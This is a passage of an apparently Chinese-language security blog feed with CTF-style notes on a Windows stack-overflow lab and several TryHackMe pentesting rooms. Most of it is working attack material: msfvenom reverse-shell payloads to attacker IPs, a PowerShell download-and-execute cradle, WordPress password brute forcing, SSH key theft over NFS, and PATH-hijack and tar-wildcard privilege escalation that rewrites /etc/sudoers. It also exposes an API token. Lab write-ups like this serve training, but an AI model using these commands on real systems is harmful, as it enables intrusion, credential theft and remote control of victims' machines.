title="寻找坏字符"></a>寻找坏字符</h3><p>badcode可能会干扰我们的 shellcode 的执行或导致我们的shellcode不被接受</p><p>有一些通常被忽略的“badchars”如00、0a、0d、20等，为了识别它们，我们首先要生成一个包含所有字符的字符串。</p><p>使用该脚本生成\x01到\xff的字符</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">for</span> <span class="hljs-attribute">x</span> in <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>):<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\\x&quot;</span> + <span class="hljs-string">&quot;&#123;:02x&#125;&quot;</span><span class="hljs-selector-class">.format</span>(<span class="hljs-attribute">x</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p>将生成的字符填入payload，重启靶机，发送payload，<em><strong>记下ESP 寄存器所指向的地址</strong></em></p><p>在虚拟靶机的Immunity中使用 mona 命令生成字节数组，默认排除空字节 (\x00)，请注意生成的 bytearray.bin 文件的位置（如果根据前面提到的参考指南中的 Mona 配置部分设置了工作文件夹，则该位置应为 C:\mona\oscp\bytearray.bin），相关命令为：</p><p><code>!mona bytearray -b &quot;\x00&quot;</code> 生成bytearray.bin</p><p>输入下面这条命令查看badchar</p><p>badchar比较命令</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">!mona <span class="hljs-built_in">compare</span> -f C:\mona\oscp\<span class="hljs-keyword">bytearray.bin </span>-a &lt;<span class="hljs-keyword">address&gt;</span><br></code></pre></td></tr></table></figure><p> <img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028020045527.png" alt="image-20231028020045527"></p><p>00在生成payload时已经被排除，所以从07开始看</p><p>首先 #使用Immunity生成新数组，生成的数组中不包含\x00字符和\x07字符。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">!mona <span class="hljs-keyword">bytearray </span>-<span class="hljs-keyword">b </span><span class="hljs-string">&quot;\x00\x07&quot;</span><br></code></pre></td></tr></table></figure><p>然后，在payload中去除07，重启oscp.exe，发送payload</p><p>然后，<em><strong>记下ESP 寄存器所指向的地址，</strong></em>输入mona badchar比较命令</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028020756514.png" alt="image-20231028020756514"></p><p>08没了 说明07是坏的，08是好的</p><p>接着去掉2e</p><p>!mona bytearray -b “\x00\x07\x2e” payload中也去掉</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028021305630.png" alt="image-20231028021305630"></p><p>说明2e是坏的，2f是好的。</p><p>接着去掉a0。</p><p>!mona bytearray -b “\x00\x07\x2e\xa0” payload中也去掉</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028022130865.png" alt="image-20231028022130865"></p><p>出现这个说明a0也是坏的 </p><p>结束</p><p>OVERFLOW1远程程序入口点对应的真实坏字符为：”\x00\x07\x2e\xa0”</p><p>若不是以上的情况</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment">#基于badchars的初始输出结果中的相邻字符进行判断</span><br>把<span class="hljs-number">23</span>去掉，在输出结果中<span class="hljs-number">24</span>没了而<span class="hljs-number">23</span>还在，说明<span class="hljs-number">23</span>是坏的。<br>!mona <span class="hljs-keyword">bytearray </span>-<span class="hljs-keyword">b </span><span class="hljs-string">&quot;\x00\x23&quot;</span><span class="hljs-comment">;exploit脚本中也去掉\x23</span><br><br>把<span class="hljs-number">3</span>c去掉，在输出结果中<span class="hljs-number">3</span>d没了而<span class="hljs-number">3</span>c还在，说明<span class="hljs-number">3</span>c是坏的。<br>!mona <span class="hljs-keyword">bytearray </span>-<span class="hljs-keyword">b </span><span class="hljs-string">&quot;\x00\x23\x3c&quot;</span><span class="hljs-comment">;exploit脚本中也去掉\x23\x3c</span><br><br>以此类推......<br><span class="hljs-number">1</span>.把<span class="hljs-number">07</span>在脚本里面删了，坏字符串这里<span class="hljs-number">07</span>还在上榜，<span class="hljs-number">08</span>没了；<span class="hljs-number">07</span>是坏的<br><span class="hljs-number">2</span>.把<span class="hljs-number">08</span>从脚本里面删了，<span class="hljs-number">07</span>还在坏字符串榜上，<span class="hljs-number">08</span>也上榜了，<span class="hljs-number">07</span>是坏的<br><span class="hljs-number">3</span>.把<span class="hljs-number">08</span>从脚本里面删了，<span class="hljs-number">07</span>、<span class="hljs-number">08</span>都在坏字符串榜上，还多个<span class="hljs-number">09</span>；<span class="hljs-number">07</span>是坏的   也有可能一对儿两个都是坏的<br>坏字符只可能是最开始!mona <span class="hljs-keyword">bytearray </span>-<span class="hljs-keyword">b </span><span class="hljs-string">&quot;\x00&quot;</span> 出来那个表里面的 ，凭空多出来的不算<br></code></pre></td></tr></table></figure><h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><h4 id="寻找跳跃点"><a href="#寻找跳跃点" class="headerlink" title="寻找跳跃点"></a>寻找跳跃点</h4><p>使用 Mona 查找 JMP 点并相应地更新漏洞利用脚本中的 RETN 变量。</p><p>启动oscp.exe</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">!mona <span class="hljs-keyword">jmp</span> -r esp -cpb <span class="hljs-string">&quot;\x00\x07\x2e\xa0&quot;</span><br><span class="hljs-meta">#-cpb 选项用于排除坏字符</span><br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028022656783.png" alt="image-20231028022656783"></p><p>选择“日志数据”窗口的输出结果中的一个地址并用于更新exploit.py 脚本中的“retn”变量</p><p>0x625011af—-&gt; 62  50  11  af  —-&gt; \x62  \x50  \x11 \xaf  —-&gt;<code>\xaf\x11\x50\62</code></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">由函数调用过程可知，一般情况下，<span class="hljs-built_in">ESP</span>中地址总是指向系统栈且不会被溢出的数据破坏，当函数返回时，<span class="hljs-built_in">ESP</span>所指的位置是淹没的返回地址的下一位（子函数平衡栈<span class="hljs-keyword">ret</span> n时，<span class="hljs-built_in">ESP</span>将指向下n位）。<br><br>开始进行出栈读写操作：<span class="hljs-built_in">eip</span>=<span class="hljs-built_in">esp</span>，<span class="hljs-built_in">eip</span>将从<span class="hljs-built_in">esp</span>的地址中指向的命令进行读取，逐步出栈，此时<span class="hljs-built_in">esp</span>开始往低地址位靠近，当<span class="hljs-built_in">esp</span>=<span class="hljs-built_in">ebp</span>时，<span class="hljs-built_in">ebp</span>读取现位置中存储的地址数据发生跳转，跳到父函数<span class="hljs-built_in">ebp</span>处。<br><br>此时<span class="hljs-built_in">esp</span>继续出栈，获取return addr，<span class="hljs-built_in">eip</span>跳转至父函数栈顶位置，跳跃后<span class="hljs-built_in">eip</span>继续根据<span class="hljs-built_in">esp</span>所含数据开始执行命令，就可以完成<span class="hljs-built_in">eip</span>的函数执行步骤（此处要注意<span class="hljs-keyword">ret</span>：<span class="hljs-keyword">pop</span> <span class="hljs-built_in">eip</span>），在本小节中：由于<span class="hljs-built_in">eip</span>函数的返回地址被我们填充为指向<span class="hljs-keyword">jmp</span> <span class="hljs-built_in">esp</span>指令的地址，所以当<span class="hljs-built_in">eip</span>从栈顶一路到栈底，就会去执行<span class="hljs-keyword">jmp</span> <span class="hljs-built_in">esp</span>指令，而这个时候，<span class="hljs-built_in">esp</span>指向的地址恰好是父函数的栈顶，我们的shellcode是经过本地机发送并存储在目标的<span class="hljs-built_in">esp</span>寄存器中的，所以我们的shellcode将会被成功执行。<br></code></pre></td></tr></table></figure><h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.13.16.58 <span class="hljs-attribute">LPORT</span>=4444 <span class="hljs-attribute">EXITFUNC</span>=thread -b <span class="hljs-string">&quot;\x00\x07\x2e\xa0&quot;</span> -f c<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.13.16.58 <span class="hljs-attribute">LPORT</span>=4444 <span class="hljs-attribute">EXITFUNC</span>=thread -b <span class="hljs-string">&quot;坏字符&quot;</span> -f c<br></code></pre></td></tr></table></figure><h4 id="前置-NOP"><a href="#前置-NOP" class="headerlink" title="前置 NOP"></a>前置 NOP</h4><p>padding &#x3D; “\x90” * 16</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">由于可能使用了编码器来生成有效载荷，因此我们还需要一些内存空间来让有效载荷自行解包；将<span class="hljs-attribute">padding</span>变量设置为 <span class="hljs-number">16</span> 个“No Operation”(\x90) 或更多的字符串——即至少添加 <span class="hljs-number">16</span> 个 NOP (\x90)在payload变量前：<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028023818737.png" alt="image-20231028023818737"></p><p>重启oscp.exe 发送payload 弹shelL</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>tryhackme_offensive_pentesting</title>
    <link href="/2023/08/22/tryhackme-offensive-pentesting/"/>
    <url>/2023/08/22/tryhackme-offensive-pentesting/</url>
    
    <content type="html"><![CDATA[<h2 id="offensive-pentesting"><a href="#offensive-pentesting" class="headerlink" title="offensive pentesting"></a>offensive pentesting</h2><h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">wpscan <span class="hljs-params">--url</span> 10.10.108.59/blog -e ap,u,t<br>-e枚举 ap枚举插件  u用户名   t主题<br><span class="hljs-params">--enumerate</span> 其他选项<br>    u 枚举用户名，默认从1-10<br>    u[10-20] 枚举用户名，配置从10-20<br>    p 枚举插件<br>    vp 只枚举有漏洞的插件<br>    ap 枚举所有插件，时间较长<br>    tt 列举缩略图相关的文件<br>    t 枚举主题信息<br>    vt 只枚举存在漏洞的主题<br>    at 枚举所有主题，时间较长<br>    可以指定多个扫描选项，例：<span class="hljs-string">&quot;-e tt,p&quot;</span><br>    如果没有指定选项，默认选项为：<span class="hljs-string">&quot;vt,tt,u,vp&quot;</span>   <br>    <br><span class="hljs-string">//</span>如果枚举出admin用户可以暴力破解<br><span class="hljs-comment"># 暴力破解admin密码</span><br>wpscan <span class="hljs-params">--url</span> http:<span class="hljs-string">//192.168.152.89</span><span class="hljs-function">:80</span> -U admin -P <span class="hljs-string">/usr/share/wordlists/rockyou.txt</span><br><br>apt-get reinstall wpscan<br>wpscan <span class="hljs-params">--update</span><br>wpscan <span class="hljs-params">--url</span> http:<span class="hljs-string">//www.farmec.cn</span><br>wpscan <span class="hljs-params">--url</span> http:<span class="hljs-string">//www.farmsec.cn</span> <span class="hljs-params">--enumerate</span> u<br>wpscan <span class="hljs-params">--url</span> http:<span class="hljs-string">//www.farmsec.cn/</span> <span class="hljs-params">--enumerate</span> vt<br><br></code></pre></td></tr></table></figure><p>扫描漏洞</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">wpscan</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&#x27;http://derpnstink.local/weblog/&#x27;</span> <span class="hljs-built_in">--api-token</span> <span class="hljs-string">&#x27;z390ayaMWMJk5E51SvBRMNfcj3IRKyJw9xP9bPkqS8Q&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="kenobi"><a href="#kenobi" class="headerlink" title="kenobi"></a>kenobi</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -T5 -p <span class="hljs-number">1</span>-<span class="hljs-number">9999</span> -sV <span class="hljs-number">10.10.93.98</span><br><span class="hljs-attribute">Starting</span> Nmap <span class="hljs-number">7</span>.<span class="hljs-number">93</span> ( https://nmap.org ) at <span class="hljs-number">2023</span>-<span class="hljs-number">10</span>-<span class="hljs-number">17</span> <span class="hljs-number">23</span>:<span class="hljs-number">21</span> CST<br><span class="hljs-attribute">Nmap</span> scan report for <span class="hljs-number">10.10.93.98</span><br><span class="hljs-attribute">Host</span> is up (<span class="hljs-number">0</span>.<span class="hljs-number">30</span>s latency).<br><span class="hljs-attribute">Not</span> shown: <span class="hljs-number">9992</span> closed tcp ports (reset)<br><span class="hljs-attribute">PORT</span>     STATE SERVICE     VERSION<br><span class="hljs-attribute">21</span>/tcp   open  ftp         ProFTPD <span class="hljs-number">1</span>.<span class="hljs-number">3</span>.<span class="hljs-number">5</span><br><span class="hljs-attribute">22</span>/tcp   open  ssh         OpenSSH <span class="hljs-number">7</span>.<span class="hljs-number">2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2.<span class="hljs-number">7</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">80</span>/tcp   open  http        Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">18</span> ((Ubuntu))<br><span class="hljs-attribute">111</span>/tcp  open  rpcbind     <span class="hljs-number">2</span>-<span class="hljs-number">4</span> (RPC #<span class="hljs-number">100000</span>)<br><span class="hljs-attribute">139</span>/tcp  open  netbios-ssn Samba smbd <span class="hljs-number">3</span>.X - <span class="hljs-number">4</span>.X (workgroup: WORKGROUP)<br><span class="hljs-attribute">445</span>/tcp  open  netbios-ssn Samba smbd <span class="hljs-number">3</span>.X - <span class="hljs-number">4</span>.X (workgroup: WORKGROUP)<br><span class="hljs-attribute">2049</span>/tcp open  nfs_acl     <span class="hljs-number">2</span>-<span class="hljs-number">3</span> (RPC #<span class="hljs-number">100227</span>)<br></code></pre></td></tr></table></figure><p>nmap扫出端口，重点关注21，111，445端口</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">445</span>端口<br>nmap -p <span class="hljs-number">445</span> --script=smb-enum-shares.nse,smb-enum-users.nse <span class="hljs-number">10.10.93.98</span><br>枚举出共享目录 \\<span class="hljs-number">10.10.93.98</span>\IPC$  \\<span class="hljs-number">10.10.93.98</span>\anonymous \\<span class="hljs-number">10.10.93.98</span>\print$<br>只有一个目录可以连接smbclient //<span class="hljs-number">10.10.93.98</span>/anonymous<br>smb: \&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Wed Sep  <span class="hljs-number">4 18:49:09</span> <span class="hljs-number">2019</span><br>  ..                                  D        <span class="hljs-number">0</span>  Wed Sep  <span class="hljs-number">4 18:56:07</span> <span class="hljs-number">2019</span><br>  log.txt                             N    <span class="hljs-number">12237</span>  Wed Sep  <span class="hljs-number">4 18:49:09</span> <span class="hljs-number">2019</span><br>smbget -R smb://<span class="hljs-number">10.10.93.98</span>/anonymous 拖出上面的log.txt后查看得到ftp的用户名kenobi和这个用户的家目录路径<br></code></pre></td></tr></table></figure><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-number">111</span>端口<br>nmap -p <span class="hljs-number">111</span> --script=<span class="hljs-built_in">nfs</span>-ls,<span class="hljs-built_in">nfs</span>-statfs,<span class="hljs-built_in">nfs</span>-showmount <span class="hljs-number">10.10</span><span class="hljs-number">.93</span><span class="hljs-number">.98</span><br>枚举出<span class="hljs-built_in">nfs</span>共享的目录为/var<br></code></pre></td></tr></table></figure><p>21端口执行以下命令，可以把kenobi用户家目录下的ssh私钥文件拷贝到nfs共享出来的&#x2F;var路径下</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/sive-pentesting/image-20231017233751964.png" alt="image-20231017233751964"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">111端口<br><span class="hljs-built_in">mkdir</span> /mnt/aaaNFS<br>mount 10.10.93.98:/var /mnt/aaaNFS<br>//nfs分享出来的路径挂载到自己本机，取出私钥<br><span class="hljs-built_in">chmod</span> 600 aaaid_rsa  //要先降权才能被ssh当做私钥使用<br>ssh -i aaaid_rsa kenobi@10.10.93.98   //得到低权用户<br>实在连不上就这样，指定秘钥类型<br>ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i key_rsa stinky@10.188.10.20<br></code></pre></td></tr></table></figure><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>寻找suid提权点，看到一个可疑/usr/bin/menu<br><span class="hljs-built_in">cd</span> /usr/bin/menu<br>./menu<br>发现这个可执行文件调用了curl，并且他是以root权限调用。path提权<br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">echo</span> /bin/sh &gt; /tmp/curl<br><span class="hljs-built_in">chmod</span> 777 /tmp/curl<br>执行/usr/bin/menu即可<br></code></pre></td></tr></table></figure><h3 id="Steel-Mountain"><a href="#Steel-Mountain" class="headerlink" title="Steel Mountain"></a>Steel Mountain</h3><p>nmap扫描出服务版本msf利用</p><p>提权：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">https:<span class="hljs-comment">//github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</span><br>meterpreter：upload PowerUp<span class="hljs-selector-class">.ps1</span><br>meterpreter：load powershell<br>meterpreter：Powershell_Shell<br>ps:. .\PowerUp<span class="hljs-selector-class">.ps1</span> <span class="hljs-comment">//扫描出AdvancedSystemCareService9服务允许重启服务、目录可写（本关前提）</span><br>msfvenom -<span class="hljs-selector-tag">p</span> windows/shell_reverse_tcp LHOST=<span class="hljs-number">10.2</span>.<span class="hljs-number">73.2</span> LPORT=<span class="hljs-number">4443</span> -e x86/shikata_ga_nai -f exe-service -o Advanced<span class="hljs-selector-class">.exe</span><br>meterpreter：upload Advanced<span class="hljs-selector-class">.exe</span><br>meterpreter：shell 进入cmd<br>cmd:copy<span class="hljs-selector-class">.exe</span> Advanced<span class="hljs-selector-class">.exe</span> 服务目录    <span class="hljs-comment">//替换服务的exe文件</span><br>kali:nc -lvp <span class="hljs-number">4443</span><br>cmd:sc start 服务名<br></code></pre></td></tr></table></figure><h3 id="jenkins-Alfred"><a href="#jenkins-Alfred" class="headerlink" title="jenkins:Alfred"></a>jenkins:Alfred</h3><p>nmap 扫出8080 jenkin web页面，admin:admin进入后台。</p><p>kali:nc -lvnp    kalitty2:python3 -m http.server 80</p><p>jenkins_web页面_build :    powershell iex (New-Object Net.WebClient).DownloadString(‘<a href="http://10.2.73.2/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp">http://10.2.73.2/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp</a> -Reverse -IPAddress 10.2.73.2 -Port 5555</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/samratashok/</span>nishang<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/Shells/</span>Invoke-PowerShellTcp.ps1<br><span class="hljs-regexp">//</span>弹powershell的shell的<br></code></pre></td></tr></table></figure><p>win低权上线，现在要换到meterpreter里面方便提权</p><p>生成木马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai <span class="hljs-attribute">LHOST</span>=IP <span class="hljs-attribute">LPORT</span>=PORT -f exe -o shell-name.exe<br></code></pre></td></tr></table></figure><p>jenkins_web_build:   </p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">powershell &quot;(New-Object System.Net.WebClient).Downloadfile(<span class="hljs-string">&#x27;http://your-ip:8000/shell-name.exe&#x27;</span>,<span class="hljs-string">&#x27;shell-name.exe&#x27;</span>)&quot;<br></code></pre></td></tr></table></figure><p>传上一个msf木马，现在要重新nc弹个shell</p><p>&#x2F;&#x2F;msf监听</p><p>nc_shell:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">Start-<span class="hljs-built_in">Process</span> -FilePath <span class="hljs-string">&quot;C:\Program Files (x86)\Jenkins\workspace\project\shell-name.exe&quot;</span><br></code></pre></td></tr></table></figure><p>meterpreter上线开始提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /priv<br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;容易出现token伪造的特权</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">SeImpersonatePrivilege</span><br><span class="hljs-attribute">SeAssignPrimaryPrivilege</span><br><span class="hljs-attribute">SeTcbPrivilege</span><br><span class="hljs-attribute">SeBackupPrivilege</span><br><span class="hljs-attribute">SeRestorePrivilege</span><br><span class="hljs-attribute">SeCreateTokenPrivilege</span><br><span class="hljs-attribute">SeLoadDriverPrivilege</span><br><span class="hljs-attribute">SeTakeOwnershipPrivilege</span><br><span class="hljs-attribute">SeDebugPrivilege</span><br></code></pre></td></tr></table></figure><p><strong>令牌伪造</strong></p><p>烂土豆？</p><p>看到目标机上有一个SeImpersonatePrivilege 有一个SeDebugPrivilege 基本可以推断这是token伪造提权。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-comment">//加插件</span><br><span class="hljs-symbol">meterpreter:</span>load incognito<br><span class="hljs-comment">//看那些token可以被伪造</span><br>meterpreter：list_tokens -g<br><span class="hljs-comment">//伪造一个管理员用户的token</span><br>meterpreter：impersonate_token <span class="hljs-string">&quot;BUILTIN\Administrators&quot;</span> <br><span class="hljs-comment">//这个时候whoami已经是管理员了，但是只是名义上的</span><br><span class="hljs-comment">//这个时候需要迁移进程到一个管理员拥有的进程当中，即可自动提权 migrate</span><br></code></pre></td></tr></table></figure><h3 id="HackPark"><a href="#HackPark" class="headerlink" title="HackPark"></a>HackPark</h3><h3 id="Skynet"><a href="#Skynet" class="headerlink" title="Skynet"></a>Skynet</h3><p>nmap -p 445 –script&#x3D;smb-enum-shares.nse,smb-enum-users.nse $IP</p><p>得到smb 匿名可读路径 、smb用户名</p><p>smbget -R smb:&#x2F;&#x2F;$IP&#x2F;anonymous</p><p>匿名共享得到密码txt</p><p>dirsearch -u </p><p>得到邮箱登录页面，用smb用户名拼接密码.txt登录进入查看邮件得到 smb用户密码</p><p>smbget -R smb:&#x2F;&#x2F;$IP&#x2F;用户名</p><p>得到网站隐私子目录，上去是一个CMS登录页面，尝试弱口令和密码爆破失败</p><p>查找exploit-db得知该cms有文件包含漏洞，通过远程文件包含pentestmonkey.php弹了一个ncshell</p><p>方法一、转为meterpreter后用post module扫描得到可用的漏洞模块提权</p><h4 id="tar提权"><a href="#tar提权" class="headerlink" title="tar提权"></a>tar提权</h4><p>方法二、上传linux枚举工具扫出兔子洞mount.ctfs不能用、查看&#x2F;etc&#x2F;crontab发现home目录下每分钟有一个cd<code>/var/www/html</code>目录下 并<strong>tar</strong>命令把文件全部打包备份的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">cd</span> /var/www/html<br>tar cf /home/milesdyson/backups/backup.tgz *<br></code></pre></td></tr></table></figure><p>进入&#x2F;var&#x2F;www&#x2F;html目录下，执行以下命令，等一分钟后sudo 后跟任何命令都是root权限。该脚本针对<code>tar</code>  后跟<code>*</code>有效</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> &#x27;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;www-data ALL=(root) NOPASSWD: ALL&quot;</span> &gt; <span class="hljs-string">/etc/sudoers</span>&#x27; &gt; privesc.sh<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;/var/www/html&quot;</span>  &gt; <span class="hljs-string">&quot;--checkpoint-action=exec=sh privesc.sh&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;/var/www/html&quot;</span>  &gt; <span class="hljs-params">--checkpoint=1</span><br></code></pre></td></tr></table></figure><h3 id="Daily-Bugle"><a href="#Daily-Bugle" class="headerlink" title="Daily Bugle"></a>Daily Bugle</h3><p>hashcat </p><p>hashcat -m3200 -a0 –force ‘<hash>‘ <path-to-rockyou></p><p>&#x2F;&#x2F;-m3200指定加密算法，具体场景中先<code>hashid &#39;$hash&#39;</code>查，然后hashcat -h查看对应列表</p><p>&#x2F;&#x2F; -a0暴力破解</p><p>hashcat -m1710 -a0 –force ‘<hash>：salt’ <path-to-rockyou></p><p>hashcat -m1710 -a0 –force ‘$hash:$salt’ &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</p><h3 id="Relevant"><a href="#Relevant" class="headerlink" title="Relevant"></a>Relevant</h3><p>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled<br>SeImpersonatePrivilege        Impersonate a client after authentication Enabled<br>SeCreateGlobalPrivilege       Create global objects                     Enabled </p><p><a href="https://www.freebuf.com/articles/network/283776.html">https://www.freebuf.com/articles/network/283776.html</a></p><h3 id="Internal"><a href="#Internal" class="headerlink" title="Internal"></a>Internal</h3><p>wps扫描，爆破的用法</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 